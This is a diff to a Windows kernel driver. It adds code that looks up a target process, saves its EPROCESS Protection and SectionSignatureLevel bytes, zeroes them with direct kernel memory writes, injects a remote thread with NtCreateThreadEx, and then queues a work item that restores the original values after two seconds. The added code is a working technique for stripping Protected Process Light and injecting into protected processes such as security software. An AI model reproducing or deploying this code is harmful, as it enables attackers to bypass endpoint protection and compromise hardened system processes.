@@ -6,6 +6,8 @@
 #include "DriverCtx.h"
 #include "Inject.h"
 #include "PE.h"
+#include "KernelOffsets.h"
+#include "mini.h"
 // Some WDK versions may not declare PsGetProcessWow64Process; forward-declare it here.
 extern PVOID PsGetProcessWow64Process(IN PEPROCESS Process);
 
@@ -40,6 +42,39 @@ typedef struct _BROADCAST_WORK {
 	PCOMM_CONTEXT* Array;
 	ULONG Count;
 } BROADCAST_WORK, *PBROADCAST_WORK;
+
+// Work item to defer EPROCESS field recovery (Protection / SectionSignatureLevel)
+typedef struct _EPROCESS_RECOVERY_WORK {
+	WORK_QUEUE_ITEM WorkItem;
+	PEPROCESS Process; // referenced
+	EPROCESS_OFFSETS Offsets; // offsets snapshot
+	UCHAR OrigProtection;
+	UCHAR OrigSectionSignatureLevel;
+} EPROCESS_RECOVERY_WORK, *PEPROCESS_RECOVERY_WORK;
+
+static VOID
+EprocessRecoveryRoutine(
+	PVOID Context
+) {
+	PEPROCESS_RECOVERY_WORK w = (PEPROCESS_RECOVERY_WORK)Context;
+	if (!w) return;
+	// Delay 2 seconds before recovery
+	LARGE_INTEGER interval; interval.QuadPart = -20000000LL; // 2s in 100ns units
+	KeDelayExecutionThread(KernelMode, FALSE, &interval);
+	__try {
+		if (w->Process) {
+			// Restore original values (ignore current protection state changes)
+			(void)Mini_WriteKernelMemory((PVOID)((PUCHAR)w->Process + w->Offsets.ProtectionOffset), &w->OrigProtection, sizeof(UCHAR));
+			(void)Mini_WriteKernelMemory((PVOID)((PUCHAR)w->Process + w->Offsets.SectionSignatureLevelOffset), &w->OrigSectionSignatureLevel, sizeof(UCHAR));
+			Log(L"Deferred recovery: restored Protection=%d SectionSignatureLevel=%d for PID=%u\n",
+				w->OrigProtection, w->OrigSectionSignatureLevel, PsGetProcessId(w->Process));
+		}
+	} __except (EXCEPTION_EXECUTE_HANDLER) {
+		Log(L"Deferred recovery: exception while restoring process fields\n");
+	}
+	if (w->Process) ObDereferenceObject(w->Process);
+	ExFreePoolWithTag(w, tag_port);
+}
 
 // Worker routine that performs deferred broadcasts from a safe system
 // context. It iterates the snapshot, sends messages, removes disconnected
@@ -1043,9 +1078,85 @@ Handle_CreateRemoteThread(
 		Log(L"user MUST provide NtCreateThreadEx kernel function address to make this work\n");
 		return STATUS_NOT_IMPLEMENTED;
 	}
+	// before create thread, remove target process's protection
+	PEPROCESS ep = NULL;
+	PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)targetPid, &ep);
+	if (!ep) {
+		Log(L"failed to call PsLookupProcessByProcessId to get EPROCESS of target PID=%u\n", targetPid);
+		if (ReturnOutputBufferLength) *ReturnOutputBufferLength = 0;
+		return STATUS_UNSUCCESSFUL;
+	}
+	EPROCESS_ORI_VALUE ori_value = { 0 };
+	if (PsIsProtectedProcess(ep)) {
+		EPROCESS_OFFSETS off;
+		if (KO_GetEprocessOffsets(&off)) {
+			if (!Mini_ReadKernelMemory((PVOID)((PUCHAR)ep + off.ProtectionOffset), &ori_value.ProtectionValue, sizeof(UCHAR))) {
+				Log(L"failed to call Mini_ReadKernelMemory to read out Protection value, target PID=%u\n", targetPid);
+				ObDereferenceObject(ep);
+				return STATUS_UNSUCCESSFUL;
+			}
+			if (!Mini_ReadKernelMemory((PVOID)((PUCHAR)ep + off.SectionSignatureLevelOffset), &ori_value.SectionSignatureLevelValue, sizeof(UCHAR))) {
+				Log(L"failed to call Mini_ReadKernelMemory to read out SectionSignatureLevel value, target PID=%u\n", targetPid);
+				ObDereferenceObject(ep);
+				return STATUS_UNSUCCESSFUL;
+			}
 
+			Log(L"get target PID=%u's original PPL=%d SectionSignatureLevel=%d\n", 
+				targetPid, ori_value.ProtectionValue, ori_value.SectionSignatureLevelValue);
+			UCHAR _ = 0;
+			if (!Mini_WriteKernelMemory((PVOID)((PUCHAR)ep + off.ProtectionOffset), &_, sizeof(UCHAR))) {
+				Log(L"failed to call Mini_WriteKernelMemory to write in Protection, target PID=%u\n", targetPid);
+				ObDereferenceObject(ep);
+				return STATUS_UNSUCCESSFUL;
+			}
+			if (!Mini_WriteKernelMemory((PVOID)((PUCHAR)ep + off.SectionSignatureLevelOffset), &_, sizeof(UCHAR))) {
+				Log(L"failed to call Mini_WriteKernelMemory to write in SectionSignatureLeve, target PID=%u\n", targetPid);
+				ObDereferenceObject(ep);
+				return STATUS_UNSUCCESSFUL;
+			}
+			Log(L"successfully zero out PPL(Protection) field of target process, PID=%u\n", targetPid);
+		}
+		else {
+			ObDereferenceObject(ep);
+			DRIVERCTX_OSVER ver = DriverCtx_GetOsVersion();
+			Log(L"unsupported windows version, Major=%u Build=%u", ver.Major, ver.Build);
+			return STATUS_UNSUCCESSFUL;
+		}
+
+		// after get original offset, we need save original value first, then we zero it our, then we call create thread
+		// then we deference EP
+	}
 	NTSTATUS status = pfnNtCreateThreadEx(extraValue, THREAD_ALL_ACCESS, NULL, proc_handle, startRoutine, parameter, 0, 0, 0, 0, NULL);
 
+	// Schedule deferred recovery (2s) if we modified a protected process
+	if (PsIsProtectedProcess(ep)) {
+		EPROCESS_OFFSETS off;
+		if (KO_GetEprocessOffsets(&off)) {
+			PEPROCESS_RECOVERY_WORK work = (PEPROCESS_RECOVERY_WORK)ExAllocatePoolWithTag(NonPagedPool, sizeof(*work), tag_port);
+			if (work) {
+				RtlZeroMemory(work, sizeof(*work));
+				work->Process = ep; // keep reference; recovery routine will dereference
+				work->Offsets = off;
+				work->OrigProtection = ori_value.ProtectionValue;
+				work->OrigSectionSignatureLevel = ori_value.SectionSignatureLevelValue;
+				ExInitializeWorkItem(&work->WorkItem, EprocessRecoveryRoutine, work);
+				ExQueueWorkItem(&work->WorkItem, DelayedWorkQueue);
+				Log(L"Queued deferred recovery work item for PID=%u (2s delay)\n", targetPid);
+			} else {
+				Log(L"Failed to allocate recovery work item, performing immediate recovery for PID=%u\n", targetPid);
+				Mini_WriteKernelMemory((PVOID)((PUCHAR)ep + off.ProtectionOffset), &ori_value.ProtectionValue, sizeof(UCHAR));
+				Mini_WriteKernelMemory((PVOID)((PUCHAR)ep + off.SectionSignatureLevelOffset), &ori_value.SectionSignatureLevelValue, sizeof(UCHAR));
+				ObDereferenceObject(ep);
+			}
+		} else {
+			DRIVERCTX_OSVER ver = DriverCtx_GetOsVersion();
+			Log(L"KO_GetEprocessOffsets failed; immediate dereference PID=%u Major=%u Build=%u\n", targetPid, ver.Major, ver.Build);
+			ObDereferenceObject(ep);
+		}
+	} else {
+		// Not protected: release reference now
+		ObDereferenceObject(ep);
+	}
 	// Note: keep hTargetProc and targetProc alive until after thread creation
 	if (!NT_SUCCESS(status)) {
 		Log(L"failed to call pfnNtCreateThreadEx, Status=0x%x\n", status);
